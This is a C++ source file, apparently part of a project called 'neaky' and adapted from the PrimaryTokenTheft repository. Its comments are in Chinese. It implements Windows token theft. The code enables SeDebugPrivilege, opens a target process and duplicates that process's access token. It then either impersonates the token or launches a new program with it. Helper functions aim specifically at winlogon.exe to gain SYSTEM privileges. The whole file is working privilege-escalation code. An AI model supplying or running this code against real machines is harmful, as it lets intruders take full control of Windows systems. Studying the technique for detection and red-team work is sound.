// https://github.com/slyd0g/PrimaryTokenTheft

#define WIN32_LEAN_AND_MEAN // 从 Windows 头文件中排除极少使用的内容
// Windows 头文件
#include <windows.h>
#include <cstdio>
#include <iostream>
#include <fstream>


#include <neaky/utils.h>

extern HINSTANCE hInst;
#define ERROR_BUF_SIZE 300
static char error_buf[ERROR_BUF_SIZE];

// 启用某个特权
BOOL SetPrivilege(
	HANDLE hToken,		   // access token handle
	LPCTSTR lpszPrivilege, // name of privilege to enable/disable
	BOOL bEnablePrivilege  // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
			NULL,		   // lookup privilege on local system
			lpszPrivilege, // privilege to lookup
			&luid))		   // receives LUID of privilege
	{
		snprintf(error_buf, ERROR_BUF_SIZE, "SetPrivilege: LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	if (!AdjustTokenPrivileges(
			hToken,
			FALSE,
			&tp,
			sizeof(TOKEN_PRIVILEGES),
			(PTOKEN_PRIVILEGES)NULL,
			(PDWORD)NULL))
	{
		snprintf(error_buf, ERROR_BUF_SIZE, "SetPrivilege: AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		snprintf(error_buf, ERROR_BUF_SIZE, "SetPrivilege: The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

// 第二个参数为NULL的时候, 第三个参数中指定可执行文件路径
char *ElevatedExecute(DWORD pid, LPCWSTR executable_path, LPWSTR command_line)
{
	// Initialize variables and structures
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);

	// Add SE debug privilege
	HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
	{
		wprintf(L"[+] SeDebugPrivilege enabled!\n");
	}
	else
	{
		return error_buf;
	}

	// Call OpenProcess(), print return code and error code
	// PROCESS_QUERY_INFORMATION is enough.
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
	//HANDLE processHandle = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);

	if (GetLastError() == NULL)
		wprintf(L"[+] OpenProcess() success!\n");
	else
	{
		snprintf(error_buf, ERROR_BUF_SIZE, "[-] OpenProcess() Return Code: %p, Error: %i\n", processHandle, GetLastError());
		return error_buf;
	}

	// Call OpenProcessToken(), print return code and error code
	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);
	if (GetLastError() == NULL)
		wprintf(L"[+] OpenProcessToken() success!\n");
	else
	{
		snprintf(error_buf, ERROR_BUF_SIZE, "[-] OpenProcessToken() Return Code: %i, Error: %i\n", getToken, GetLastError());
		return error_buf;
	}

	BOOL duplicateToken = DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
	if (GetLastError() == NULL)
		wprintf(L"[+] DuplicateTokenEx() success!\n");
	else
	{
		snprintf(error_buf, ERROR_BUF_SIZE, "[-] DuplicateTokenEx() Return Code: %i, Error: %i\n", duplicateToken, GetLastError());
		return error_buf;
	}

	BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, executable_path, command_line, 0, NULL, NULL, &startupInfo, &processInformation);
	if (GetLastError() == NULL)
		wprintf(L"[+] Process spawned!\n");
	else
	{
		snprintf(error_buf, ERROR_BUF_SIZE, "[-] CreateProcessWithTokenW Return Code: %i, Error: %i\n", createProcess, GetLastError());
		return error_buf;
	}

	return NULL;
}

// 窃取对应PID的Token，用于提权
char *ElevateSelf(DWORD pid)
{
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);

	// 开启 SEDebugPrivilege
	HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
	{
		wprintf(L"[+] SeDebugPrivilege enabled!\n");
	}
	else
	{
		return error_buf;
	}

	// Call OpenProcess(), print return code and error code
	// PROCESS_QUERY_INFORMATION is enough.
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
	//HANDLE processHandle = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);

	if (GetLastError() == NULL)
	{
		wprintf(L"[+] OpenProcess() success!\n");
	}
	else
	{
		snprintf(error_buf, ERROR_BUF_SIZE, "[-] OpenProcess() Return Code: %p, Error: %i\n", processHandle, GetLastError());
		return error_buf;
	}

	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);
	if (GetLastError() == NULL)
	{
		wprintf(L"[+] OpenProcessToken() success!\n");
	}
	else
	{
		snprintf(error_buf, ERROR_BUF_SIZE, "[-] OpenProcessToken() Return Code: %i, Error: %i\n", getToken, GetLastError());
		return error_buf;
	}

	// 提升当前线程的权限
	BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
	if (GetLastError() == NULL)
	{
		wprintf(L"[+] ImpersonatedLoggedOnUser() success!\n");
	}
	else
	{
		snprintf(error_buf, ERROR_BUF_SIZE, "[-] ImpersonatedLoggedOnUser() Return Code: %i, Error: %i\n", impersonateUser, GetLastError());
		return error_buf;
	}
	return NULL;
}

// 窃取winlogon.exe的Token提升到SYSTEM权限
char *ElevateSelf()
{
	DWORD pid = GetPIDByName(L"winlogon.exe");
	if (pid == NULL)
	{
		snprintf(error_buf, ERROR_BUF_SIZE, "ElevateSelf: Unable to get pid of winlogon.exe.");
		return error_buf;
	}
	return ElevateSelf(pid);
}

// 窃取winlogon.exe的Token并执行其他程序
char *ElevatedExecute(LPCWSTR executable_path, LPWSTR command_line)
{
	DWORD pid = GetPIDByName(L"winlogon.exe");
	if (pid == NULL)
	{
		snprintf(error_buf, ERROR_BUF_SIZE, "ElevatedExecute: Unable to get pid of winlogon.exe.");
		return error_buf;
	}
	return ElevatedExecute(pid, executable_path, command_line);
}
